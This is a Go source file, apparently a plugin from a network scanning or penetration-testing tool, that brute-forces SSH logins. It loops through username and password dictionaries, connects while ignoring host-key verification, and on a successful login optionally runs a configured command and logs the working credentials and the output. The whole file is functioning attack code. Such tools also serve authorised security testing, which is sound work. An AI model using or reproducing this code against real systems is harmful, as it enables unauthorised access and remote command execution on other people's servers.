package Plugins

import (
	"errors"
	"fmt"
	"fs/config"
	"golang.org/x/crypto/ssh"
	"io/ioutil"
	"strings"
	"time"
)

func sshBruteforce(info *config.HostInfo) (tmperr error) {
	// 检查是否启用暴力破解
	if config.NoBrute {
		return
	}
	starTime := time.Now().Unix()
	for _, user := range config.Userdict["ssh"] {
		for _, passwd := range config.Passwords {
			passwd = strings.Replace(passwd, "{user}", user, -1)
			flag, err := attemptSSH(info, user, passwd)
			if flag == true && err == nil {
				return err
			} else {
				errlog := fmt.Sprintf("[-] ssh %v:%v %v %v %v", info.Host, info.Ports, user, passwd, err)
				config.LogError(errlog)
				tmperr = err
				if config.CheckErrs(err) {
					return err
				}
				if time.Now().Unix()-starTime > (int64(len(config.Userdict["ssh"])*len(config.Passwords)) * config.Timeout) {
					return err
				}
			}
			if config.SshKey != "" {
				return err
			}
		}
	}
	return tmperr
}

func attemptSSH(info *config.HostInfo, user string, pass string) (flag bool, err error) {
	flag = false
	Host, Port, Username, Password := info.Host, info.Ports, user, pass
	var Auth []ssh.AuthMethod
	if config.SshKey != "" {
		pemBytes, err := ioutil.ReadFile(config.SshKey)
		if err != nil {
			return false, errors.New("read key failed" + err.Error())
		}
		signer, err := ssh.ParsePrivateKey(pemBytes)
		if err != nil {
			return false, errors.New("parse key failed" + err.Error())
		}
		Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}
	} else {
		Auth = []ssh.AuthMethod{ssh.Password(Password)}
	}

	sshConfig := &ssh.ClientConfig{
		User:            Username,
		Auth:            Auth,
		Timeout:         2 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	conn, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", Host, Port), sshConfig)
	if err != nil {
		//fmt.Printf("Connection failed! %v (Password: %s)\n", err, Password)
		return
	}
	defer conn.Close()
	session, err := conn.NewSession()
	if err == nil {
		defer session.Close()
		flag = true
		var result string
		if config.Command != "" {
			combo, _ := session.CombinedOutput(config.Command)
			result = fmt.Sprintf("[+] SSH %v:%v:%v %v \n %v", Host, Port, Username, Password, string(combo))
			if config.SshKey != "" {
				result = fmt.Sprintf("[+] SSH %v:%v sshkey correct \n %v", Host, Port, string(combo))
			}
			config.LogSuccess(result)
		} else {
			result = fmt.Sprintf("[+] SSH %v:%v:%v %v", Host, Port, Username, Password)
			if config.SshKey != "" {
				result = fmt.Sprintf("[+] SSH %v:%v sshkey correct", Host, Port)
			}
			config.LogSuccess(result)
		}
	}
	return flag, err
}
